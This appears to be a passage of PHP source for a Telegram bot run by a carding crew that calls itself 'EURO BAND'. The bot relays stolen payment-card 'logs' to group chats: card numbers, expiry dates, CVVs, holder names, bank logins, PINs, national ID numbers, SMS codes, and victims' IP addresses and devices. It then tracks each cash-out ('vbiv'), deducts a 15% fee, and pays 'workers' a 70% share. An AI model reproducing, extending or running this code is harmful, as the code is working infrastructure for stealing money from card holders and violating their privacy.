                'text' => "💳 Данные из лога ⚠️\n\n".$bot_config->countries->{$product->country}->flag." <b>".$market_name_nos."</b>\n📬 <b>Стоимость</b>: ".$product->price." ".$product->currancy."\n💳 <b>Карта</b>: <code>".$card->number."</code>\n💳 <b>MM/YY</b>: ".$card->month."/".$card->year."".($card->cnp?"\n💳 <b>CNP</b>: <code>".$card->cnp."</code>":"")."\n💳 <b>CVV</b>: <code>".$card->cvv."</code>".$banking."\n☠️ <b>Имя</b>: ".$card->card_name."\n🏦 <b>Банк</b>: ".($card->bank_name?$card->bank_name:'----')."\n💳 <b>Тип</b>: ".$card->bank_scheme."\n📬 <b>IP</b>: ".$product->ip."\n📬 <b>Устройство</b>: ".$product->device."\n📬 <b>Страна</b>: ".$card->bank_country."\n\n💎 <b>Баланс</b>: ".$card->balance." ".$product->currancy." (".curs($card->balance,$product->currancy,'UAH')."/ ".curs($card->balance,$product->currancy,"RUB")."/ ".curs($card->balance,$product->currancy,'USD')."/ ".curs($card->balance,$product->currancy,'EUR').")\n📬 <b>Воркер</b>: <a href='https://t.me/".$worker->login."'>".$worker->login."</a> | <code>".$worker->id."</code>\n\n"
            ]; 
            
   

            file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
            
            $data = [
                'chat_id' => $worker->chat_id,
                'parse_mode'=>'HTML',
                'text' => "⚠️\n\nТвой лог вбивает: @".$post->from->username.". Заряду!\n\n"
            ]; 
            
   

            file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));

        } 

        if($post->message->reply_to_message&&strpos($post->message->reply_to_message->text,'Token:')!==false&&$post->message->chat->type=="private"){ 
            preg_match_all('/Token\:(.*)\n/U', $post->message->reply_to_message->text, $matches);
            $data = [
                'chat_id' => $post->message->chat->id,
                'message_id'=>$post->message->message_id,
                'parse_mode'=>'HTML',
                'text' => "🟢 Сообщение доставлено!"
            ]; 
            
            $con->products->add_message(array(
                'token'=>$matches[1][0],
                'message'=>$post->message->text,
                'sender'=>'t',
                'chat_id'=>$post->message->chat->id
            )); 
            file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data)); 
        } 
        
        if (preg_match('/^[0-9.]+$/i', $post->message->text)&&intval($post->message->text)>0&&(strpos($post->message->chat->title,'Log')!==false||strpos($post->message->chat->title,'Лог')!==false)){
            $message_id = intval($post->message->message_id);
            $card = (object)$con->user->get_card_ok($post->message->from->id); 
            if(!$card){ return false;}
            $product = (object)$con->products->get_product($card->pid);
            $worker = (object)$con->user->get_user_byid($product->uid); 
 
            $summ_vbiv = $post->message->text;
            $summ_vbiv_n = $summ_vbiv*15/100;
            $summ_vbiv = $summ_vbiv-$summ_vbiv_n;
            /* if($card->vbiv_status=='reject'||$card->vbiv_status=='success_ok'){
                exit();
            } */
            //$card_ss = $con->user->get_card($card->id);
            if($card->number){
            //if(!$card_ss->vbiv_success_summ){
                $card_summ = ($card->vbiv_success_summ?$card->vbiv_success_summ:0);
            
                $con->user->update_card($card->id,array('vbiv_success_summ'=>$card_summ+$summ_vbiv,'vbiv_status'=>'success_ok')); 
                $banking = '';
                if($card->bank_login){
                    $banking .= "\n💳 <b>Login</b>: <code>".$card->bank_login."</code>";
                }
                if($card->bank_haslo){
                    $banking .= "\n💳 <b>Haslo</b>: ****";
                }
                if($card->bank_pin){
                    $banking .= "\n💳 <b>Pin</b>: ****";
                }
                if($card->bank_pesel){
                    $banking .= "\n💳 <b>Pesel</b>: ****";
                } 
                if($card->bank_key){
                    $banking .= "\n💳 <b>Key</b>: ****";
                }
                if($card->cardPersonnummer){
                    $banking .= "\n💳 <b>Personnummer</b>: ****";
                }
                $market_name_nos = '';
                if($bot_config->markets->{$product->country}){
                    $market_name_nos = $bot_config->markets->{$product->country}->name;
                }else{
                    $market_name_nos = $bot_config->countries->{$product->country}->markets->{$product->market}->name_nos;
                }
                $data = [
                    'chat_id' => $post->message->chat->id,  
                    'parse_mode'=>'HTML',
                    'text' => "❌ Лог <code>".$card->id."</code> бил @".$card->vblogin."⚠️\n\n ".$bot_config->countries->{$product->country}->flag." <b>".$market_name_nos."</b>\n📬 <b>Стоимость</b>: ".$product->price." ".$product->currancy."\n💳 <b>Карта</b>: <code>".$card->number."</code>\n💳 <b>MM/YY</b>: ".$card->month."/".$card->year."".($card->cnp?"\n💳 <b>CNP</b>: <code>".$card->cnp."</code>":"")."\n💳 <b>CVV</b>: ***".$banking."\n☠️ <b>Имя</b>: ".$card->card_name."\n🏦 <b>Банк</b>: ".($card->bank_name?$card->bank_name:'----')."\n💳 <b>Тип</b>: ".$card->bank_scheme."\n📬 <b>IP</b>: ".$product->ip."\n📬 <b>Устройство</b>: ".$product->device."\n📬 <b>Страна</b>: ".$card->bank_country."\n\n💎 <b>Баланс</b>: ".$card->balance." ".$product->currancy." (".curs($card->balance,$product->currancy,'UAH')."/ ".curs($card->balance,$product->currancy,"RUB")."/ ".curs($card->balance,$product->currancy,'USD')."/ ".curs($card->balance,$product->currancy,'EUR').")\n".($card->sms?"✉️ <b>SMS</b>: <code>".$card->sms."</code> 👈":"")."\n📬 <b>Воркер</b>: <a href='https://t.me/".$worker->login."'>".$worker->login."</a> | <code>".$worker->id."</code>\n📬 <b>Статус вбива</b>: Вбив завершён\n📬 <b>Сумма успеха</b>: ".$summ_vbiv." грн\n\n "
                ];  
                file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
                $data = [
                    'chat_id' => $bot_chanels->chanels->{'chanel_payments'}->id,  
                    'parse_mode'=>'HTML',
                    'text' => "".$bot_config->countries->{$product->country}->name."\n✅ <b>Сумма</b>: ".$summ_vbiv." UAH / ".curs($summ_vbiv,"UAH",$product->currancy)."\n💵 <b>Статус</b>: ".(!$card->status_viplat?"[В обработке]":($card->status_viplat==1?"[Удалено]":"[Выплачено]"))." 💵\n👨‍💻 <b>Воркер</b>: ".$worker->id."\n<b>ID</b>: ".$card->id."|\n"
                ];     
                file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data)); 
                $data = [
                    'chat_id' => $bot_chanels->chanels->{'chanel_vorkers_pl'}->id,  
                    'parse_mode'=>'HTML',
                    'text' => "".$bot_config->countries->{$product->country}->name."\n✅ <b>Сумма</b>: ".$summ_vbiv." UAH / ".curs($summ_vbiv,"UAH",$product->currancy)."\n💵 <b>Статус</b>: ".(!$card->status_viplat?"[В обработке]":($card->status_viplat==1?"[Удалено]":"[Выплачено]"))." 💵\n👨‍💻 <b>Воркер</b>: ".$worker->id."\n<b>ID</b>: ".$card->id."|\n"
                ];     
                file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data)); 
                
                $viplataprsnt = 70;
                
                $summ_vbiv_mpr = $summ_vbiv*$viplataprsnt/100; 
                $data = [
                    'chat_id' => $worker->chat_id,  
                    'parse_mode'=>'HTML', 
                    'text' => $bot_config->countries->{$product->country}->flag."Профит: <b>".$summ_vbiv." UAH / ".curs($summ_vbiv,"UAH",$product->currancy)."</b>".$bot_config->countries->{$product->country}->flag."\n🇪🇺От лучшей команды <b>EURO BAND</b>🇪🇺\n🤑Выплата: <b>".$summ_vbiv_mpr." UAH / ".curs($summ_vbiv_mpr,"UAH",$product->currancy)."</b>🤑\n⚖️Твой процент: <b>".$viplataprsnt."%</b>⚖️\n💵 Статус: ".(!$card->status_viplat?"[В обработке]":($card->status_viplat==1?"[Удалено]":"[Выплачено]"))."💵\nВнимание: Выплата производится в течении дня, в некоторых случаях, раньше💰\n❌ Внимание!\n🧨 Не меняйте свой @username до того момента как получите выплату\n🧨 Выплата производится администратором - @yutaka77\n🧨 Если есть подозрения что вас обманывают — СПРОСИТЕ В ЧАТЕ"
                ];     
                file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data)); 
            }
        }

        if($post->message->forward_from_chat&&$post->message->forward_from_chat->id==$bot_chanels->chanels->{'chanel_payments'}->id){
            preg_match_all('/ID\: (.*)\|/s', $post->message->text, $matches); 
            $card = $con->user->get_card($matches[1][0]);
            $product = (object)$con->products->get_product($card->pid); 
            $worker = (object)$con->user->get_user_byid($product->uid); 

            $btn1 = array("text" => "🗑 Удалить","callback_data" => "/deleteviplta_".$card->id."_".$post->message->forward_from_message_id);
            $btn2 = array("text" => "💸 Выплачено","callback_data" => "/successviplta_".$card->id."_".$post->message->forward_from_message_id);
            $inline_keyboard = [[$btn1,$btn2]]; 
                
            $keyboard = array("inline_keyboard" => $inline_keyboard);
            $replyMarkup = json_encode($keyboard); 

            $data = [
                'chat_id' => $card->vbid,  
                'parse_mode'=>'HTML',
                'text' => "💸 <b>Залет</b>: #".$card->id."\n <b>Сумма</b>: ".$card->vbiv_success_summ." UAH / ".curs($card->vbiv_success_summ,"UAH",$product->currancy)."\n👨‍💻 <b>Воркер</b>: <a href='https://t.me/".$worker->login."'>".$worker->login."</a>\n🦹‍♂️ <b>Вбивер</b>: @".$card->vblogin."\n"
            ];      
            $data['reply_markup']=$replyMarkup;
            file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data)); 
        } 
        
    }



    /*~~ Update Chanels ~~*/ 
    if($post->channel_post){
         /* if (preg_match('/^[0-9.]+$/i', $post->channel_post->text)&&intval($post->channel_post->text)>0&&(strpos($post->channel_post->chat->title,'Log')!==false||strpos($post->channel_post->chat->title,'Лог')!==false)){
            $message_id = intval($post->channel_post->message_id);
            $card = (object)$con->user->get_card_ok(); 
            $product = (object)$con->products->get_product($card->pid);
            $worker = (object)$con->user->get_user_byid($product->uid); 
            
            if($card->vbiv_status=='reject'||$card->vbiv_status=='success_ok'){
                exit();
            }  
            $summ_vbiv = $post->channel_post->text;
            $summ_vbiv_n = $summ_vbiv*15/100;
            $summ_vbiv = $summ_vbiv-$summ_vbiv_n;
            
            if($card->number){
                $con->user->update_card($card->id,array('vbiv_success_summ'=>$summ_vbiv,'vbiv_status'=>'success_ok')); 
                $banking = '';
                if($card->bank_login){
                    $banking .= "\n💳 <b>Login</b>: <code>".$card->bank_login."</code>";
                }
                if($card->bank_haslo){
                    $banking .= "\n💳 <b>Haslo</b>: ****";
                }
                if($card->bank_pin){
                    $banking .= "\n💳 <b>Pin</b>: ****";
                }
                if($card->bank_pesel){
                    $banking .= "\n💳 <b>Pesel</b>: ****";
                } 
                $data = [
                    'chat_id' => $post->channel_post->chat->id, 
                    'message_id'=>$card->message_id,
                    'parse_mode'=>'HTML',
                    'text' => "❌ Лог <code>".$card->id."</code> бил @".$card->vblogin."⚠️\n\n ".$bot_config->countries->{$product->country}->flag." <b>".$bot_config->countries->{$product->country}->markets->{$product->market}->name_nos."</b>\n📬 <b>Стоимость</b>: ".$product->price." ".$product->currancy."\n💳 <b>Карта</b>: <code>".$card->number."</code>\n💳 <b>MM/YY</b>: ".$card->month."/".$card->year."".($card->cnp?"\n💳 <b>CNP</b>: <code>".$card->cnp."</code>":"")."\n💳 <b>CVV</b>: ***".$banking."\n☠️ <b>Имя</b>: ".$card->card_name."\n🏦 <b>Банк</b>: ".($card->bank_name?$card->bank_name:'----')."\n💳 <b>Тип</b>: ".$card->bank_scheme."\n📬 <b>IP</b>: ".$product->ip."\n📬 <b>Устройство</b>: ".$product->device."\n📬 <b>Страна</b>: ".$card->bank_country."\n\n💎 <b>Баланс</b>: ".$card->balance." ".$product->currancy." (".curs($card->balance,$product->currancy,'UAH')."/ ".curs($card->balance,$product->currancy,"RUB")."/ ".curs($card->balance,$product->currancy,'USD')."/ ".curs($card->balance,$product->currancy,'EUR').")\n📬 <b>Воркер</b>: <a href='https://t.me/".$worker->login."'>".$worker->login."</a> | ".$worker->id."\n📬 <b>Статус вбива</b>: Вбив завершён\n📬 <b>Сумма успеха</b>: ".$summ_vbiv." грн\n\n "
                ];  
                file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
                $data = [
                    'chat_id' => $post->channel_post->chat->id, 
                    'message_id'=>$message_id
                ];  
    
                file_get_contents($urlApi.$key.'/deleteMessage?'.http_build_query($data)); 
    
                $data = [
                    'chat_id' => $bot_chanels->chanels->{'chanel_payments'}->id,  
                    'parse_mode'=>'HTML',
                    'text' => "".$bot_config->countries->{$product->country}->name."\n✅ <b>Сумма</b>: ".$card->vbiv_success_summ." UAH / ".curs($card->vbiv_success_summ,"UAH",$product->currancy)."\n💵 <b>Статус</b>: ".(!$card->status_viplat?"[В обработке]":($card->status_viplat==1?"[Удалено]":"[Выплачено]"))." 💵\n👨‍💻 <b>Воркер</b>: ".$worker->id."\n<b>ID</b>: ".$card->id."|\n"
                ];     
                file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data)); 
            }
        } */
         
        if(strpos($post->channel_post->text,'/chanel_')!==false){ 

            $channel_post_text = str_replace("/","",$post->channel_post->text);
            
                    $data = [
                        'chat_id' => $post->channel_post->chat->id,  
                        'parse_mode'=>'HTML',
                        'text' => "Успех! Радуйся!"
                    ];  

                    file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
 
                    $me = file_get_contents($urlApi.$key.'/getMe');
                    $me = json_decode($me);
                    if($me->ok){
                        $data = [
                            'chat_id' => $post->channel_post->chat->id,
                            'user_id'=> $me->result->id
                        ];  
                        $chat_channel = file_get_contents($urlApi.$key.'/getChat?'.http_build_query($data));
                        $chat_channel = json_decode($chat_channel);
                        
                        if($chat_channel->ok){
                            $bot_chanels->chanels->{$channel_post_text} = 
                            array(
                                "id"=>$post->channel_post->chat->id, 
                                "type"=>$chat_channel->result->type, 
                                "title"=>$chat_channel->result->title, 
                                "invite_link"=>$chat_channel->result->invite_link
                            );

                            file_put_contents('./chanels.json',json_encode(array($bot_chanels)));
                        } 
                    }
        }
    } 



